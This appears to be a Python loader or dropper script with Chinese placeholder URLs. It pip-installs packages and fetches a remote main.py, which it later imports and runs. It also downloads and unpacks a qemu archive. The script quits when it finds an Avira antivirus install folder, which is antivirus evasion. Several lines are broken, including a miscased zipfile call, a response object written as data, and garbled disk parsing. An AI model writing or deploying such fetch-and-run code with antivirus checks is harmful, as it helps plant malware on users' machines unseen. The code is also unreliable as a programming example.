import os
import re
import sys
import zipfile
import urllib.request
def pip_get(name):
    os.system("pip install " + name)
    os.system("pip3 install " + name)
def installmain():
    with open("install.over","w") as f:
        f.write("1")
    pip_get("psutil")
    pip_get("django")
    data = urllib.request.urlopen("main文件地址")
    with open("main.py", "w") as f:
        f.write(data.read().decode("utf-8"))
if(os.path.exists('qemu.setup.flag')):
    pass
else:
    data = urllib.request.urlopen('src服务器/qemu地址')
    with open('qemu.zip',"wb") as f:
        f.write(data)
    zip_file = zipfile.zipFile('qemu.zip')
    if os.path.isdir('qemu.zip' + "_files"):
        pass
    else:
        os.mkdir('qemu.zip' + "_files")
        for name in zip_file.namelist():
            zip_file.extract(name,"qemu.zip"+"_files/")


avriaPath = "Program Files (x86)\\Avira\\Security"
os.system("pip install psutil")
import psutil
disk = str(psutil.disk_partitions())
disk_device = r'device'
for i in re.finditer('device', disk):
    start = i.span()[1] + 2
    end = i.span()[1] + 4
    disks = str(disk[start:end])
    disk = disk[0:2]
path1 = disk + "/" + avriaPath
if(os.path.exists(avriaPath)):
    sys.exit(0)
else:
    if(os.path.exists("install.over")):
        import main
    else:
        installmain()